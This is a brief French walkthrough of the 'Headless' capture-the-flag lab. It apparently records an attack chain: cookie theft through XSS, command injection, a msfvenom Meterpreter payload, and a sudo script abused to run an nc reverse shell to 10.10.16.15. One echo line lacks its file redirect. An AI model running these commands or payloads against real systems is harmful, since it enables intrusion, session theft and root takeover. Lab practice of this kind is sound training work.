# headless
```shell
# on nmap et fuzz on find sur port 5000 un truc pour soumettre report
nmap -sC -sV 10.10.11.8
# port 5000
# on check avec navigateur ce qu'il y a 
# on peut form, on remarque aussi cookies custom
# on try xss pour recup admin cookie en usant python http.server et payload
# on a alert dans champs message, on inject payload dans useragent 
# on recup admin cookies on change dans le navigateur puis on acces a dashboard
# Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0

#on intercept POST request, on add ls en sautant une ligne apres le post data, on a la cmd qui sexecute ==> on va rce 
# on upload meterpreter 
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.15 LPORT=4444 -f elf > shell.elf
python3 -m http.server
# on met listener et go 
# on ouvre shell depuis meterpreter
sudo -l
# on peut execute /usr/bin/syscheck avec sudo NOPASSWD
cat /usr/bin/syscheck
# on le print on voit qu'il execute initdb.sh depuis repertoire courant
# cest un script custom
# on excrit nc listener dans initdb.sh
echo '#!/bin/bash' > initdb.sh
echo 'nc 10.10.16.15 4445 -e /bin/bash'
nc -lvnp 4445
sudo /usr/bin/syscheck
# on est root 
```
